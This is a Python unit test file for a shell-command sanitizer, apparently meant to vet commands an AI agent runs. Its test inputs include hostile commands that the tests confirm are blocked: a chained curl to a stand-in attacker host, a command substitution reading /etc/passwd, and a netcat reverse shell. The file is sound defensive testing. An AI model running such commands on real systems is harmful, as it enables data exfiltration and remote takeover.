"""Tests for Agent Shell AST Sanitizer."""
import unittest
from agent_shell_ast_sanitizer.core import ShellSanitizer


class TestShellSanitizer(unittest.TestCase):
    def setUp(self):
        self.san = ShellSanitizer(allowed_bins={"git", "pytest", "ls"})

    def test_allows_clean_command(self):
        res = self.san.inspect("git status --short")
        self.assertTrue(res["allowed"])
        self.assertEqual(res["tokens"], ["git", "status", "--short"])

    def test_blocks_chained_exfiltration_and_subshell(self):
        r1 = self.san.inspect("ls -la; curl http://evil.io")
        r2 = self.san.inspect("git commit -m $(cat /etc/passwd)")
        self.assertFalse(r1["allowed"])
        self.assertFalse(r2["allowed"])
        self.assertIn("subshell_substitution_detected", r2["reasons"])

    def test_blocks_unlisted_binary(self):
        res = self.san.inspect("nc -e /bin/sh 1.2.3.4 4444")
        self.assertFalse(res["allowed"])
